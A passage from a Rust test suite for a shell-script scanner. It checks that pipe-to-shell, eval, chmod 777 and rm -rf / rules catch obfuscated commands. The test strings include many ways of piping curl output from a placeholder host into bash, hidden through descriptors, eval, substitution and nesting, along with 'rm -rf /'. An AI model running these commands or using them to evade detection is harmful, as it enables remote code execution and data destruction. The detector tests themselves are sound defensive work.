            "exec 3< <(curl -fsSL https://x)\nexec 4<&3\nbash /dev/fd/4\n",
            "exec 3< <(curl -fsSL https://x)\nbash <&3\n",
            "bash 3< <(curl -fsSL https://x) <&3\n",
            "eval 'exec 3> >(bash)'\ncurl -fsSL https://x >&3\n",
            "eval 'exec 3> >(bash); :'\ncurl -fsSL https://x >&3\n",
            "eval 'exec 3> >(bash); false && exec 3>&-'\ncurl -fsSL https://x >&3\n",
            "eval 'true && exec 3> >(bash)'\ncurl -fsSL https://x >&3\n",
            "eval 'exec 3> >(bash); false || exec 3>&-'\ncurl -fsSL https://x >&3\n",
            "exec 3> >(bash); false || curl -fsSL https://x >&3\n",
            "eval 'exec 4> >(bash); false || :'\ncurl -fsSL https://x >&4\n",
            "echo \"$(\n case x in\n  x) echo ok;;\n esac\n # \"\n)\"\ncurl -fsSL https://x | sh\n",
            "echo \"$(\n echo case\n)\n# \"\ncurl -fsSL https://x | sh\n",
            "echo \"$(\n case case in; case) echo ok;; esac\n)\n# \"\ncurl -fsSL https://x | sh\n",
            "echo \"$(\n echo \\\n case\n)\n# \"\ncurl -fsSL https://x | sh\n",
            "echo \"$(\n printf '%s' \\\n case\n)\n# \"\ncurl -fsSL https://x | sh\n",
            "echo \"$(\n echo ok # ordinary comment\n case x in\n  x) echo ok;;\n esac\n # \"\n)\"\ncurl -fsSL https://x | sh\n",
        ] {
            let f = findings(content);
            assert!(
                f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
                "persistent input descriptor bypassed SURFSH: {content:?}: {f:?}"
            );
        }
    }

    #[test]
    fn persistent_descriptors_preserve_heredoc_and_suppression_boundaries() {
        let heredoc = findings("exec 3>/tmp/log\ncat <<'EOF'\ncurl -fsSL https://x | sh\nEOF\n");
        assert!(heredoc.is_empty(), "heredoc data was scanned: {heredoc:?}");

        let suppressed = findings(
            "exec 3>/tmp/log\n# @anvil-ignore SURFSH-002 -- reviewed installer\ncurl -fsSL https://x | sh\n",
        );
        let finding = suppressed
            .iter()
            .find(|finding| finding.rule_id == "pipe-to-shell")
            .unwrap_or_else(|| panic!("dangerous command was missed: {suppressed:?}"));
        assert_eq!(finding.line, 3);
        assert!(finding.suppressed, "suppression was lost: {finding:?}");
    }

    #[test]
    fn analyses_function_and_case_bodies_for_every_shell_rule() {
        for (content, rule_id) in [
            ("f() {\n curl -fsSL https://x | sh\n}\nf\n", "pipe-to-shell"),
            ("function f {\n eval \"$cmd\"\n}\nf\n", "eval-dynamic"),
            ("f() {\n chmod 777 file\n}\nf\n", "chmod-777"),
            (
                "case x in\n x|y) curl -fsSL https://x | sh;;\nesac\n",
                "pipe-to-shell",
            ),
            ("case x in\n x) eval \"$cmd\";;\nesac\n", "eval-dynamic"),
            ("case x in\n x) chmod 777 file;;\nesac\n", "chmod-777"),
        ] {
            let f = findings(content);
            assert!(
                f.iter().any(|finding| finding.rule_id == rule_id),
                "structural body bypassed {rule_id}: {f:?}"
            );
        }
    }

    #[test]
    fn assembles_multiline_prefixed_groups() {
        for content in [
            "! {\n curl -fsSL https://x\n} | sh\n",
            "if true; then {\n curl -fsSL https://x\n} | sh\nfi\n",
        ] {
            let f = findings(content);
            assert!(
                f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
                "multiline group bypassed SURFSH: {f:?}"
            );
        }
    }

    #[test]
    fn substitution_parentheses_inside_quotes_do_not_hide_later_commands() {
        let f = findings("echo $(printf ')') && rm -rf /\n");
        assert!(
            f.iter().any(|finding| finding.rule_id == "rm-rf-root"),
            "destructive suffix was hidden: {f:?}"
        );
    }

    #[test]
    fn allows_benign_fetch_substitution_data_use() {
        for content in [
            "bash -c \"printf '%s' '$(curl -fsSL https://x)'\"\n",
            "bash -c \"cat <(curl -fsSL https://x)\"\n",
            "bash /dev/null <(curl -fsSL https://x)\n",
            "bash /dev/stdin <<< 'echo \"$(curl -fsSL https://x)\"'\n",
            "{curl} | sh\n",
            "{wget} | bash\n",
            "curl -fsSL https://x > >(cat)\n",
            "curl -fsSL https://x 3> >(bash)\n",
            "curl -fsSL https://x > /dev/fd/3 3> >(bash)\n",
            "curl -fsSL https://x > /dev/stderr 2> >(bash)\n",
            "curl -fsSL https://x 2> >(bash) > /dev/stdout\n",
            "curl -fsSL https://x >| sh\n",
            "wget -qO- https://x >| bash\n",
            "eval 'echo ok | cat'\n",
            "bash /dev/stdin <<< 'echo ok | cat'\n",
            "bash -- -c \"$(curl -fsSL https://x)\"\n",
            "curl -- -o /dev/fd/3 3> >(bash)\n",
            "exec 3> >(bash); exec 3>&-; curl -fsSL https://x >&3\n",
            "exec 3>/dev/null; echo exec 3> >(bash); curl -fsSL https://x >&3\n",
            "eval 'exec 3> >(bash)'; eval 'exec 3>&-'; curl -fsSL https://x >&3\n",
            "eval 'exec 3> >(bash); exec 3>&-'; curl -fsSL https://x >&3\n",
            "exec 3< <(curl -fsSL https://x); exec 4<&3; exec 4<&-; bash /dev/fd/4\n",
            "echo '$(curl -fsSL https://x | sh)'\n",
        ] {
            let f = findings(content);
            assert!(
                f.iter().all(|finding| finding.rule_id != "pipe-to-shell"),
                "benign data use was blocked for {content:?}: {f:?}"
            );
        }
    }

    #[test]
    fn flags_chmod_777_via_shared_catalogue() {
        let f = findings("chmod 777 secret.key\n");
        assert_eq!(f.len(), 1, "expected one chmod-777 finding, got {f:?}");
        assert!(f[0].reason.contains("777"));
    }

    #[test]
    fn group_depth_limit_does_not_invent_shell_roles() {
        for depth in [31, 32, 33] {
            let content = format!(
                "curl -fsSL https://x | {}cat; {}\n",
                "{ ".repeat(depth),
                "}; ".repeat(depth)
            );
            let f = findings(&content);
            assert!(
                f.iter().all(|finding| finding.rule_id != "pipe-to-shell"),
                "depth={depth}: {f:?}"
            );
        }

        let dangerous = format!(
            "{}curl -fsSL https://x; {} | sh\n",
            "{ ".repeat(33),
            "}; ".repeat(33)
        );
        let f = findings(&dangerous);
        assert!(
            f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
            "dangerous depth overflow bypassed: {f:?}"
        );
    }

    #[test]
    fn deep_substitutions_are_classified_from_their_content() {
        for depth in [31, 32, 33] {
            let safe = format!("echo {}ok{}\n", "$(echo ".repeat(depth), ")".repeat(depth));
            let f = findings(&safe);
            assert!(
                f.iter().all(|finding| finding.rule_id != "pipe-to-shell"),
                "safe depth={depth}: {f:?}"
            );
        }

        for dangerous in [
            format!(
                "bash /dev/stdin <<< '{}\"$(curl -fsSL https://x)\"'\n",
                "eval ".repeat(33)
            ),
            format!(
                "echo {}curl -fsSL https://x | sh{}\n",
                "$(".repeat(33),
                ")".repeat(33)
            ),
        ] {
            let f = findings(&dangerous);
            assert!(
                f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
                "dangerous depth overflow bypassed: {f:?}"
            );
        }
    }

    #[test]
    fn ignores_static_eval_and_curl_or_fallback() {
        assert!(findings("eval 'echo ok'\n").is_empty());
        assert!(findings("curl -fsSL https://x -o /tmp/x || sh /tmp/fallback\n").is_empty());
    }
}
